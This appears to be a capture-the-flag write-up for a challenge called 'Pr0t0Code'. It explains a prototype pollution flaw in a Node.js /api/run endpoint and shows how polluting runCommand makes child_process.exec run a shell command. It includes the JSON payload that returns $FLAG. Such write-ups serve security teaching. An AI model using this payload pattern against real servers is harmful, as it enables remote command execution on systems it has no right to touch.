## Pr0t0Code

### 1. Vulnerability (Prototype Pollution)
The `/api/run` endpoint merges user-supplied test cases with default ones using an unvalidated recursive function (`unsafeMerge`). Because it explicitly allows traversing the `__proto__` key, any properties defined inside it are injected directly into the global `Object.prototype`.

### 2. The Gadget (Remote Code Execution)
Before executing the test runner, the server initializes an empty configuration object and checks for a command string:

```javascript
let runnerConfig = {}; 
let command = runnerConfig.runCommand || "node --version"; 
exec(command, ...)

```

Since runnerConfig has no own properties, it inherits from Object.prototype. If runCommand is polluted, child_process.exec() runs the attacker's shell command instead of the default version check.

### 3. Solution
Send a POST request to /api/run with a payload that pollutes runCommand to echo the flag variable.

### Payload

```
{
  "code": "function solve() { return true; }",
  "testcases": {
    "__proto__": {
      "runCommand": "echo $FLAG"
    }
  }
}
```

The flag is executed via the system shell and returned directly within the engine_status field of the JSON response.